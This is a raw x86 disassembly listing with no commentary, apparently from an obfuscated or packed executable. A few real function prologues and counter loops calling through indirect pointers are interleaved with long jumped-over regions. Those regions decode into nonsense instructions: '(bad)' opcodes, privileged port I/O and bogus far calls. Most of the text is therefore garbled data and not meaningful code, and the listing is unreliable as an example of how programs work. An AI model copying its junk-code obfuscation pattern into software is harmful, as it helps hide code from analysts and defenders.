  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
  404a8b:	dec    esp
  404a8c:	fsubr  QWORD PTR [esi]
  404a8e:	or     eax,DWORD PTR [edi+0x25]
  404a91:	jle    0x404b11
  404a93:	xchg   ecx,eax
  404a94:	jl     0x404b14
  404a96:	jle    0x404a2f
  404a98:	clc    
  404a99:	jbe    0x404b0a
  404a9b:	arpl   dx,sp
  404a9d:	xchg   esp,eax
  404a9e:	stos   DWORD PTR es:[edi],eax
  404a9f:	jae    0x404a40
  404aa1:	xor    al,BYTE PTR [esi+0x5f17a126]
  404aa7:	push   ss
  404aa8:	cmp    edi,esp
  404aaa:	mov    ch,ah
  404aac:	fidivr WORD PTR [edx+0x2a6a4d72]
  404ab2:	xor    DWORD PTR [esi-0x69],eax
  404ab5:	(bad)  
  404ab7:	mov    esi,0x29133d81
  404abc:	in     eax,dx
  404abd:	hlt    
  404abe:	sub    eax,0x63b8e50a
  404ac3:	fadd   QWORD PTR es:[edx-0x2f96f645]
  404aca:	shl    DWORD PTR [edx],1
  404acc:	inc    edx
  404acd:	jmp    0xcf72fc4c
  404ad2:	rcr    DWORD PTR [eax-0x1a],0x51
  404ad6:	adc    esp,DWORD PTR [edx-0x4b5a63d6]
  404adc:	test   DWORD PTR [eax+0x4b71eafe],edi
  404ae2:	mov    bl,0x98
  404ae4:	adc    ebx,DWORD PTR [ebx-0x61]
  404ae7:	mov    edi,0x84eb66b6
  404aec:	and    ah,ch
  404aee:	jae    0x404b22
  404af0:	sbb    ebx,DWORD PTR [esi+0x7d0784f]
  404af6:	dec    esi
  404af7:	sbb    DWORD PTR [ebx+0x59f5970e],0x91d60e09
  404b01:	stc    
  404b02:	mov    dh,0xe8
  404b04:	jns    0x404b1e
  404b06:	mov    ebx,esi
  404b08:	inc    esp
  404b09:	fcomp  QWORD PTR [esi+0x4f76c0de]
  404b0f:	nop
  404b10:	rcr    BYTE PTR [ecx-0x3d],1
  404b13:	cdq    
  404b14:	cwde   
  404b15:	push   edi
  404b16:	pop    esi
  404b17:	in     eax,0xb8
  404b19:	sti    
  404b1a:	mov    gs,WORD PTR [edx]
  404b1c:	sub    eax,0x286e73a
  404b21:	jmp    0x404adf
  404b23:	mov    ebp,0xbbaa0d03
  404b28:	mov    ecx,0x226b21b5
  404b2d:	sbb    eax,0x26d0aa7d
  404b32:	xor    DWORD PTR [edx+0x78af6246],ecx
  404b38:	sbb    BYTE PTR [ebp-0x64],bl
  404b3b:	mov    bh,0x29
  404b3d:	mov    al,ds:0x774c4ec5
  404b42:	push   es
  404b43:	dec    edi
  404b44:	cmp    DWORD PTR gs:[edx],0x7b9148a2
  404b4b:	call   0x9d92:0xda410678
  404b52:	js     0x404b06
  404b54:	lods   al,BYTE PTR ds:[esi]
  404b55:	xchg   edi,eax
  404b56:	mov    ecx,0x54b1be2e
  404b5b:	imul   esp,eax,0xad271b7
  404b61:	jl     0x404b72
  404b63:	dec    esi
  404b64:	out    0x8c,eax
  404b66:	push   ss
  404b67:	rol    DWORD PTR [edx+0x2d8347f0],cl
  404b6d:	xchg   edi,eax
  404b6e:	xchg   esp,eax
  404b6f:	in     eax,0x98
  404b71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b72:	push   es
  404b73:	ret    
  404b74:	int    0x11
  404b76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b77:	jo     0x404b83
  404b79:	mov    eax,ds:0x8e1e257c
  404b7e:	push   ebp
  404b7f:	cmc    
  404b80:	cmc    
  404b81:	enter  0x33d6,0x99
  404b85:	xchg   esp,eax
  404b86:	iret   
  404b87:	lea    edi,[edx-0x7503e4eb]
  404b8d:	sub    ch,BYTE PTR [edi]
  404b8f:	int3   
  404b90:	add    esi,DWORD PTR [edi-0x44]
  404b93:	xor    esi,DWORD PTR [eax]
  404b95:	icebp  
  404b96:	cmp    DWORD PTR [eax+0x55],0x33
  404b9a:	push   esp
  404b9b:	inc    edx
  404b9c:	in     eax,0xbf
  404b9e:	lods   al,BYTE PTR ds:[esi]
  404b9f:	jle    0x404c17
  404ba1:	ins    DWORD PTR es:[edi],dx
  404ba2:	fild   DWORD PTR [ebp+0x619f3144]
  404ba8:	sub    bh,bh
  404baa:	mov    ebx,0x2793edb0
  404baf:	mov    al,ds:0xd6d05556
  404bb4:	fmul   QWORD PTR [ecx+ecx*8-0x5db2e09]
  404bbb:	and    al,0x10
  404bbd:	xchg   edi,eax
  404bbe:	xchg   edi,eax
  404bbf:	dec    ebx
  404bc0:	inc    esi
  404bc1:	stos   DWORD PTR es:[edi],eax
  404bc2:	(bad)  
  404bc3:	enter  0x8e22,0xc7
  404bc7:	data16 stc 
  404bc9:	(bad)  
  404bca:	retf   0xfaa6
  404bcd:	rol    DWORD PTR [ebx+0x7e],1
  404bd0:	aaa    
  404bd1:	mov    bh,0x85
  404bd3:	int3   
  404bd4:	es sti 
  404bd6:	lods   eax,DWORD PTR ds:[esi]
  404bd7:	aas    
  404bd8:	dec    ecx
  404bd9:	lock add esi,0x1e8b75f7
  404be0:	mov    esi,0xb6d53ddc
  404be5:	test   al,0xf0
  404be7:	clc    
  404be8:	enter  0x2cec,0xa4
  404bec:	test   eax,0x2d785d1c
  404bf1:	bound  eax,QWORD PTR [ecx+0x50f31a6b]
  404bf7:	sbb    ah,BYTE PTR ds:0x4c24a287
  404bfd:	data16 fincstp 
  404c00:	not    DWORD PTR ds:[ebp+0x2aab17d0]
  404c07:	add    DWORD PTR [esi],ecx
  404c09:	push   ebx
  404c0a:	(bad)  [esi+0x15fdc036]
  404c10:	mov    ebp,0x33f9af2f
  404c15:	pop    esp
  404c16:	jmp    0x214d:0xb0a76bd
  404c1d:	inc    eax
  404c1e:	cdq    
  404c1f:	into   
  404c20:	xor    ah,BYTE PTR ds:0xe7303258
  404c26:	push   es
  404c27:	ficom  DWORD PTR [eax+0x3dbc6d6]
  404c2d:	in     al,dx
  404c2e:	sbb    BYTE PTR [esi],ah
  404c30:	push   ebx
  404c31:	ror    cl,cl
  404c33:	mov    BYTE PTR [edx-0x69],ah
  404c36:	in     eax,dx
  404c37:	ror    DWORD PTR [ecx+0x7f],cl
  404c3a:	(bad)  
  404c3b:	xchg   ebp,eax
  404c3c:	mov    ds:0x5799eb7f,eax
  404c41:	int    0x8e
  404c43:	jbe    0x404c2e
  404c45:	mov    ebx,DWORD PTR [esp+ecx*8]
  404c48:	(bad)  
  404c49:	xchg   edx,eax
  404c4a:	mov    edi,0x828fbeb3
  404c4f:	lods   eax,DWORD PTR ds:[esi]
  404c50:	popa   
  404c51:	dec    edi
  404c52:	scas   al,BYTE PTR es:[edi]
  404c53:	inc    esi
  404c54:	mov    ds:0x8bec2216,eax
  404c59:	push   cs
  404c5a:	(bad)  
  404c5b:	stos   DWORD PTR es:[edi],eax
  404c5c:	sbb    eax,0x6ca8d871
  404c61:	arpl   bx,sp
  404c63:	mov    bh,0x3e
  404c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c66:	in     al,dx
  404c67:	mov    eax,DWORD PTR [edx]
  404c69:	les    esi,FWORD PTR [edi-0x80]
  404c6c:	push   0xc265bbb0
  404c71:	push   eax
  404c72:	xchg   edx,eax
  404c73:	(bad)  
  404c74:	repz sahf 
  404c76:	fdiv   DWORD PTR [ebp+0x6023b944]
  404c7c:	mov    WORD PTR [ebx-0x34],gs
  404c7f:	inc    ebx
  404c80:	in     eax,0x47
  404c82:	pusha  
  404c83:	scas   eax,DWORD PTR es:[edi]
  404c84:	or     BYTE PTR [ecx-0x212a27f0],ch
  404c8a:	xor    BYTE PTR [ebp+0x13],dh
  404c8d:	add    eax,0x13b7ff1d
  404c92:	or     DWORD PTR [eax+ebp*8-0x439b6371],ebp
  404c99:	sbb    eax,0xde866b74
  404c9e:	test   eax,0x492743c2
  404ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ca4:	nop
  404ca5:	mov    DWORD PTR [esp+ebx*2-0x1a3d8680],edx
  404cac:	sbb    BYTE PTR [ebx+0x70],0x3d
  404cb0:	test   eax,0xa6f21723
  404cb5:	xchg   ecx,eax
  404cb6:	adc    eax,edx
  404cb8:	loope  0x404d24
  404cba:	scas   eax,DWORD PTR es:[edi]
  404cbb:	addr16 dec esp
  404cbd:	mov    esp,0x88cb77ab
  404cc2:	sub    eax,0x65a17600
  404cc7:	retf   
  404cc8:	dec    ebx
  404cc9:	cmp    eax,0x17aeb61f
  404cce:	and    ebp,DWORD PTR [eax+0x28e91cbc]
  404cd4:	dec    ebx
  404cd5:	add    BYTE PTR [ecx-0x26],al
  404cd8:	push   ds
  404cd9:	icebp  
  404cda:	xor    bl,dh
  404cdc:	stos   DWORD PTR es:[edi],eax
  404cdd:	xchg   esi,eax
  404cdf:	popf   
  404ce0:	add    dl,BYTE PTR es:0xc3c128c6
  404ce7:	pop    ebx
  404ce8:	gs jmp 0x24436595
  404cee:	bswap  esi
  404cf0:	mov    edx,0x1f6c3a7c
  404cf5:	push   ds
  404cf6:	add    BYTE PTR [ebx],dh
  404cf8:	xchg   ebp,eax
  404cf9:	xor    cl,dl
  404cfb:	fscale 
  404cfd:	ins    DWORD PTR es:[edi],dx
  404cfe:	jg     0x404cc3
  404d00:	test   eax,0xb213659f
  404d06:	push   ds
  404d07:	and    al,0x1c
  404d09:	int3   
  404d0a:	pop    ss
  404d0b:	add    eax,0xf2aa7041
  404d10:	ins    BYTE PTR es:[edi],dx
  404d11:	ins    BYTE PTR es:[edi],dx
  404d12:	push   eax
  404d13:	(bad)  
  404d14:	lock sub edx,esi
  404d17:	lock daa 
  404d19:	mov    ds:0x636bc635,al
  404d1e:	cdq    
  404d1f:	clc    
  404d20:	inc    edi
  404d21:	mov    fs,esp
  404d23:	jecxz  0x404d25
  404d25:	mov    al,ds:0xa5aa04ae
  404d2a:	shl    DWORD PTR [edi],cl
  404d2c:	add    al,0x47
  404d2e:	lods   al,BYTE PTR ds:[esi]
  404d2f:	pushf  
  404d30:	repz idiv BYTE PTR [edx-0x28]
  404d34:	sbb    BYTE PTR [esi-0x9],al
  404d37:	icebp  
  404d38:	mov    ecx,DWORD PTR [ebp+0x10]
  404d3b:	and    ecx,eax
  404d3d:	or     ecx,0x81161d8f
  404d43:	mov    eax,ecx
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0xe09ad6c3
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404d2b
  404d6a:	js     0x404da3
  404d6c:	and    eax,0x26c4eed1
  404d71:	out    0xf5,al
  404d73:	mov    fs,WORD PTR [edx]
  404d75:	push   eax
  404d76:	test   eax,0xdc258001
  404d7b:	adc    BYTE PTR [edi],ah
  404d7d:	adc    DWORD PTR [esi-0x7c],ecx
  404d80:	mov    esp,0xb340a513
  404d85:	cld    
  404d86:	jbe    0x404d43
  404d88:	jmp    0x8ca8fe2c
  404d8d:	stc    
  404d8e:	lock fwait
  404d90:	xchg   edi,eax
  404d91:	mov    ds:0xb2c8333b,al
  404d96:	shl    BYTE PTR [ebx],1
  404d98:	mov    eax,0x740e9ae7
  404d9d:	inc    esp
  404d9e:	cmp    dh,ch
  404da0:	shl    ebx,1
  404da2:	push   esi
  404da3:	cmp    al,BYTE PTR [ebp*1-0x9586312]
  404daa:	jne    0x404d52
  404dac:	(bad)  
  404dad:	(bad)  
  404dae:	loopne 0x404d7c
  404db0:	pop    bx
  404db2:	pop    ebp
  404db3:	mov    eax,es
  404db5:	mov    bh,0x50
  404db7:	mov    edi,0xaea6ff1d
  404dbc:	dec    esi
  404dbd:	push   0x3c
  404dbf:	lock mov cl,0x5e
  404dc2:	cmp    eax,0x42bda750
  404dc7:	push   edx
  404dc8:	ror    DWORD PTR [esi+eax*4],cl
  404dcb:	sbb    eax,0xbed3a822
  404dd0:	out    dx,al
  404dd1:	push   0x3a
  404dd3:	push   0xa4374b69
  404dd8:	mov    cs:0xfd8b8a2f,eax
  404dde:	push   edi
  404ddf:	push   edi
  404de0:	inc    esp
  404de1:	mov    ebp,0xb3bd6362
  404de6:	setle  BYTE PTR ds:0xb970becf
  404ded:	lahf   
  404dee:	test   eax,0xfab0b16e
  404df3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404df5:	sbb    BYTE PTR [edx],al
  404df7:	adc    al,0x28
  404df9:	pop    ebp
  404dfa:	arpl   WORD PTR [edi],sp
  404dfc:	int3   
  404dfd:	stos   BYTE PTR es:[edi],al
  404dfe:	iret   
  404dff:	cmp    DWORD PTR [edi+0x2a],ecx
  404e02:	fxch   st(5)
  404e04:	imul   eax,edi,0xe8234071
  404e0a:	or     al,0xe1
  404e0c:	(bad)  
  404e0d:	push   cs
  404e0e:	mov    ss,WORD PTR [ecx]
  404e10:	cmp    BYTE PTR [edx+edi*8],bl
  404e13:	sbb    al,BYTE PTR [edx+0x7d8ad4ac]
  404e19:	sbb    dl,cl
  404e1b:	adc    DWORD PTR [edi],ebx
  404e1d:	fdivr  st(1),st
  404e1f:	in     eax,0xae
  404e21:	mov    bl,bh
  404e23:	out    dx,al
  404e24:	mov    ds,edx
  404e26:	add    bl,BYTE PTR [ebx+0x36]
  404e29:	ja     0x404dc3
  404e2b:	pop    edi
  404e2c:	pop    eax
  404e2d:	out    dx,al
  404e2e:	push   es
  404e2f:	jne    0x404de9
  404e31:	push   ebx
  404e32:	data16 (bad) 
  404e34:	fnstenv [edx-0x58]
  404e37:	and    al,0x66
  404e39:	jecxz  0x404dc1
  404e3b:	jp     0x404dc9
  404e3d:	outs   dx,BYTE PTR ds:[esi]
  404e3e:	fcomp  DWORD PTR [edi]
  404e40:	adc    eax,0xa76c6f70
  404e45:	loopne 0x404dd9
  404e47:	cmp    eax,0x5f647ef5
  404e4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e4d:	adc    BYTE PTR [ebp+0x7b],bl
  404e50:	xchg   edx,eax
  404e51:	mov    DWORD PTR [edi-0x5e],ebx
  404e54:	mov    esi,0x36ade0d8
  404e59:	in     eax,0x96
  404e5b:	shl    DWORD PTR [ecx],cl
  404e5d:	xchg   ebx,eax
  404e5e:	std    
  404e5f:	and    BYTE PTR [eax-0x50],dl
  404e62:	dec    ecx
  404e63:	or     BYTE PTR [edi+eiz*8+0x30525ef8],bh
  404e6a:	or     eax,0xde2b66f4
  404e6f:	call   0x286d:0xa4c04b5f
  404e76:	add    al,0x9a
  404e78:	xor    DWORD PTR [esp+ebx*2],ebp
  404e7b:	inc    edx
  404e7c:	je     0x404e18
  404e7e:	dec    esi
  404e7f:	outs   dx,BYTE PTR ds:[esi]
  404e80:	dec    edi
  404e81:	(bad)  
  404e82:	pop    ebp
  404e83:	jbe    0x404eaa
  404e85:	xchg   ebp,eax
  404e86:	jmp    0x404e82
  404e88:	ins    BYTE PTR es:[edi],dx
  404e89:	xchg   ecx,eax
  404e8a:	std    
  404e8b:	jge    0x404efa
  404e8d:	sub    DWORD PTR [esi-0x18],esi
  404e90:	jno    0x404e13
  404e92:	mov    WORD PTR [edi+edi*1-0x4e0609ed],es
  404e99:	sub    al,0xb3
  404e9b:	shl    BYTE PTR ds:0x43cd009b,1
  404ea1:	ja     0x404e86
  404ea3:	ins    DWORD PTR es:[edi],dx
  404ea4:	xor    edx,DWORD PTR [edi-0x2f]
  404ea7:	sbb    cl,dl
  404ea9:	ja     0x404e30
  404eab:	stos   DWORD PTR es:[edi],eax
  404eac:	ss leave 
  404eae:	call   FWORD PTR [esp+ebx*4+0x26]
  404eb2:	xchg   esi,eax
  404eb3:	loope  0x404e70
  404eb5:	adc    edx,0x61
  404eb8:	lahf   
  404eb9:	dec    ebp
  404eba:	lds    esp,FWORD PTR ds:0xd037dcb9
  404ec0:	add    al,0xd3
  404ec2:	gs jns 0x404e6c
  404ec5:	sbb    esp,ebx
  404ec7:	outs   dx,DWORD PTR ds:[esi]
  404ec8:	xchg   ebx,eax
  404ec9:	dec    esp
  404eca:	sub    edi,DWORD PTR [esi-0x5b]
  404ecd:	xchg   DWORD PTR cs:[edi],ebp
  404ed0:	jge    0x404e94
  404ed2:	adc    cl,bl
  404ed4:	jl     0x404ef7
  404ed6:	or     esp,DWORD PTR [eax]
  404ed8:	inc    cl
  404eda:	(bad)  
  404edb:	xlat   BYTE PTR ds:[ebx]
  404edc:	inc    eax
  404edd:	mov    ds:0x2958fb93,eax
  404ee2:	xchg   DWORD PTR [ebx-0x6eadcf9f],ecx
  404ee8:	das    
  404ee9:	retf   
  404eea:	mov    ah,0xbf
  404eec:	dec    edi
  404eed:	cmp    esp,DWORD PTR [edi-0x4e]
  404ef0:	adc    al,0x7e
  404ef2:	dec    eax
  404ef3:	addr16 mov cl,0xca
  404ef6:	pop    ds
  404ef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ef8:	sub    edi,DWORD PTR [eax+0x11e8696d]
  404efe:	inc    esi
  404eff:	xchg   edx,eax
  404f00:	popf   
  404f01:	dec    edi
  404f02:	xor    BYTE PTR [ecx-0x33d8b01e],dh
  404f08:	jae    0x404f47
  404f0a:	cdq    
  404f0b:	add    al,0xc4
  404f0d:	or     bh,BYTE PTR [ecx-0x19eb2cad]
  404f13:	jecxz  0x404f8b
  404f15:	daa    
  404f16:	cmp    eax,0xcfe4338d
  404f1b:	mov    esi,0x543391bc
  404f20:	push   DWORD PTR [ebp+0x1335a9ae]
  404f26:	mov    cl,0xea
  404f28:	pop    ebp
  404f29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f2a:	sbb    eax,DWORD PTR [ebx]
  404f2c:	adc    DWORD PTR [ebx+0x14ea0cab],0xffffff88
  404f33:	aas    
  404f34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f35:	sub    dl,cl
  404f37:	fwait
  404f38:	pop    edx
  404f39:	push   eax
  404f3a:	div    eax
  404f3c:	xor    eax,0x65d06fb7
  404f41:	sbb    ah,ah
  404f43:	pop    esi
  404f44:	test   BYTE PTR [esi],0x5c
  404f47:	cmp    bh,BYTE PTR [ecx]
  404f49:	sbb    eax,ecx
  404f4b:	loopne 0x404ed7
  404f4d:	dec    esi
  404f4e:	pop    ecx
  404f4f:	mov    BYTE PTR [edx],bh
  404f51:	and    DWORD PTR [esi-0x5d1fdad0],0x33
  404f58:	xchg   ebx,eax
  404f59:	push   ecx
  404f5a:	and    DWORD PTR ds:0x430459,0x0
  404f64:	jmp    0x404f74
  404f69:	mov    eax,ds:0x430459
  404f6e:	inc    eax
  404f6f:	mov    ds:0x430459,eax
  404f74:	cmp    DWORD PTR ds:0x430459,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x430459,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e7d4
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42ea9f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42edd7
  404faf:	xor    edx,DWORD PTR ds:0x430451
  404fb5:	mov    DWORD PTR ds:0x42edd7,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ee69
  404fc8:	mov    eax,ds:0x42e983
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e7d8
  404fdc:	sub    ecx,DWORD PTR ds:0x43044d
  404fe2:	mov    DWORD PTR ds:0x42e7d8,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42edf3,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42edf3
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42edf3,ecx
  405002:	cmp    DWORD PTR ds:0x42edf3,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e9d3
  405018:	cmp    DWORD PTR ds:0x42edf3,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42edf3
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42edf3,ecx
  405034:	cmp    DWORD PTR ds:0x42edf3,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	mov    cl,0xea
  405054:	mov    ds:0x7e2ed68e,eax
  405059:	jle    0x4050c9
  40505b:	jg     0x4050db
  40505d:	jle    0x40501b
  40505f:	test   DWORD PTR [esi+ecx*1-0x32],edi
  405063:	jb     0x40503e
  405065:	mov    edi,0x22b89a62
  40506a:	bound  esp,QWORD PTR [ecx-0x25]
  40506d:	xlat   BYTE PTR ds:[ebx]
  40506e:	xor    ebp,DWORD PTR [esi-0x32395724]
  405074:	sub    bl,BYTE PTR [eax]
  405076:	ins    BYTE PTR es:[edi],dx
  405077:	inc    ebx
  405078:	cmp    BYTE PTR [ecx+0x3add00e1],ah
  40507e:	std    
  40507f:	mov    al,0x59
  405081:	or     DWORD PTR [ecx+0xf],edx
  405084:	xor    BYTE PTR ds:0x151ab0ec,bl
  40508a:	sar    BYTE PTR [ebp+0x7b45f001],cl
  405090:	neg    ebx
  405092:	nop
  405093:	ret    0x3583
  405096:	mov    ch,0x60
  405098:	mov    cl,0x85
  40509a:	rdpmc  
  40509c:	aam    0xdb
  40509e:	xlat   BYTE PTR ds:[ebx]
  40509f:	sub    esi,ebp
  4050a1:	test   DWORD PTR [eax],eax
  4050a3:	aad    0x7d
  4050a5:	retf   0xcd08
  4050a8:	clc    
  4050a9:	addr16 xchg edi,eax
  4050ab:	mov    al,ds:0x4dd57204
  4050b0:	test   DWORD PTR [ebp+0x2b],0x7aea4bc6
  4050b7:	adc    eax,0x30773ed3
  4050bc:	scas   eax,DWORD PTR es:[edi]
  4050bd:	add    BYTE PTR [edx],dl
  4050bf:	lods   al,BYTE PTR ds:[esi]
  4050c0:	dec    ebp
  4050c1:	dec    eax
  4050c2:	mov    esi,0x16e40f70
  4050c7:	retf   
  4050c8:	mov    eax,ds:0x9bc150ed
  4050cd:	pop    es
  4050ce:	out    0x76,al
  4050d0:	sbb    edi,DWORD PTR [esi]
  4050d2:	jne    0x4050fc
  4050d4:	fsubr  st,st(1)
  4050d6:	mov    ds:0xad042a47,al
  4050db:	(bad)  
  4050dc:	xor    al,0x10
  4050de:	cmp    eax,0xf2225e07
  4050e3:	in     eax,dx
  4050e4:	nop
  4050e5:	shl    DWORD PTR [edx],1
  4050e7:	pop    edi
  4050e8:	pop    ebp
  4050e9:	adc    BYTE PTR [edi-0x2e],bl
  4050ec:	xor    dl,bh
  4050ee:	fnstsw WORD PTR [ebx-0x6f1ccffb]
  4050f4:	bound  esi,QWORD PTR [edx-0x3a]
  4050f7:	pusha  
  4050f8:	clc    
  4050f9:	xchg   ecx,eax
  4050fa:	mov    ds:0x4a106d2f,eax
  4050ff:	push   ss
  405100:	and    al,0xdb
  405102:	adc    cl,BYTE PTR [ebx-0x3cd68b7b]
  405108:	xchg   DWORD PTR [edi],eax
  40510a:	lods   al,BYTE PTR ds:[esi]
  40510b:	rcl    ebp,1
  40510d:	cmp    DWORD PTR [ecx],edx
  40510f:	pushf  
  405110:	cli    
  405111:	into   
  405112:	pop    ds
  405113:	adc    al,0x2f
  405115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405116:	cmp    cl,BYTE PTR [ecx]
  405118:	dec    ebx
  405119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40511a:	sbb    dh,al
  40511c:	jp     0x405156
  40511e:	in     al,0x15
  405120:	lahf   
  405121:	dec    eax
  405122:	mov    esi,0x50abc748
  405127:	or     DWORD PTR [esp+ebp*8],ebp
  40512a:	mov    ds:0xcb594e52,eax
  40512f:	adc    ecx,DWORD PTR [eax-0x24]
  405132:	mov    ebx,0x5c47633f
  405137:	mov    ds:0xfe15dc46,al
  40513c:	jecxz  0x4050e3
  40513e:	retf   0x6e9b
  405141:	sar    DWORD PTR [esi-0x1b],0x2a
  405145:	pop    es
  405146:	ja     0x4050d1
  405148:	iret   
  405149:	test   BYTE PTR [ebx+0x8],0xeb
  40514d:	or     al,0xf7
  40514f:	hlt    
  405150:	mov    esp,0xc01c1e07
  405155:	outs   dx,BYTE PTR ds:[esi]
  405156:	pop    edx
  405157:	inc    edi
  405159:	and    bh,al
  40515b:	mov    eax,ds:0x4dc81a92
  405160:	mov    ebx,0x38bed572
  405165:	(bad)  
  405166:	scas   eax,DWORD PTR es:[edi]
  405167:	pop    ebx
  405168:	dec    ebx
  405169:	add    esi,ebx
  40516b:	repz mov WORD PTR [edi+0x3b],ds
  40516f:	pop    ebp
  405170:	int3   
  405171:	jne    0x405124
  405173:	lock xchg esp,eax
  405175:	add    bl,BYTE PTR [ebp+0x262427fa]
  40517b:	jmp    0xb1577b2f
  405180:	popa   
  405181:	pop    ecx
  405182:	jg     0x405112
  405184:	jge    0x4051c7
  405186:	inc    ebx
  405187:	fcomp  QWORD PTR [edx+0x6a1d06d9]
  40518d:	fwait
  40518e:	mov    dl,0xb2
  405190:	scas   eax,DWORD PTR es:[edi]
  405191:	mov    bh,0xc2
  405193:	pop    es
  405194:	xor    DWORD PTR ss:[eax+0x33],ebx
  405198:	push   ecx
  405199:	pop    edi
  40519a:	mov    ds:0xa0812cd,eax
  40519f:	mov    BYTE PTR [ebp-0x3cfd0666],cl
  4051a5:	cmc    
  4051a6:	loope  0x40520e
  4051a8:	sbb    eax,0x9ce4e2dd
  4051ad:	mov    al,0x39
  4051af:	enter  0x57c3,0xe4
  4051b3:	xor    DWORD PTR ds:0x12bb1730,edi
  4051b9:	push   edx
  4051ba:	shl    BYTE PTR ss:0xa040919,1
  4051c1:	add    al,0x35
  4051c3:	push   0xffffffa5
  4051c5:	pop    ecx
  4051c6:	sti    
  4051c7:	xchg   ebp,eax
  4051c8:	(bad)  
  4051c9:	dec    ebx
  4051ca:	and    eax,ebp
  4051cc:	dec    edi
  4051cd:	dec    eax
  4051ce:	mov    ebx,0xa8f663d9
  4051d3:	mov    dh,0x25
  4051d5:	xchg   ebx,eax
  4051d6:	fwait
  4051d7:	dec    esp
  4051d8:	inc    esi
  4051d9:	(bad)  
  4051da:	(bad)  
  4051dc:	ficom  DWORD PTR [ebx]
  4051de:	push   ebp
  4051df:	sbb    al,0xcc
  4051e1:	in     eax,dx
  4051e2:	sti    
  4051e3:	mov    ah,0x41
  4051e5:	pop    edx
  4051e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051e7:	imul   edi,DWORD PTR [ebp+0x150e7f49],0xffffffb3
  4051ee:	in     eax,dx
  4051ef:	(bad)  
  4051f0:	loop   0x40519f
  4051f2:	mov    ecx,0xe50d9e15
  4051f7:	aad    0x96
  4051f9:	rcr    BYTE PTR [esi],1
  4051fb:	stos   DWORD PTR es:[edi],eax
  4051fc:	and    BYTE PTR [ecx],al
  4051fe:	or     al,0x79
  405200:	out    0xcc,al
  405202:	pop    esi
  405203:	adc    cl,BYTE PTR [edi]
  405205:	jo     0x40523e
  405207:	(bad)  
  405208:	not    DWORD PTR [eax+0x4f4bc8bd]
  40520e:	pop    ecx
  40520f:	sub    edi,edi
  405211:	dec    ebx
  405212:	mov    eax,ds:0x116b1898
  405217:	dec    edi
  405218:	shr    bl,1
  40521a:	and    eax,0xcfa5d653
  40521f:	and    bh,BYTE PTR [esi]
  405221:	push   0xb6729a70
  405226:	push   ebx
  405227:	jg     0x405279
  405229:	mov    eax,0x8a5f67f9
  40522e:	xchg   dl,bh
  405230:	push   edx
  405231:	out    0xa6,al
  405233:	pushf  
  405234:	sbb    bh,BYTE PTR [ecx+0x167689ba]
  40523a:	sbb    al,0x58
  40523c:	jge    0x405230
  40523e:	ficomp WORD PTR [edi]
  405240:	adc    ecx,ebp
  405242:	fldcw  WORD PTR [ebx]
  405244:	mov    ds:0x2db34ffb,al
  405249:	sub    BYTE PTR [edx-0x4625d2d3],dl
  40524f:	push   esp
  405250:	or     BYTE PTR [ecx+0x7],dl
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
  405265:	mov    eax,DWORD PTR [ebp+0x18]
  405268:	mov    edx,DWORD PTR [ebp+0x10]
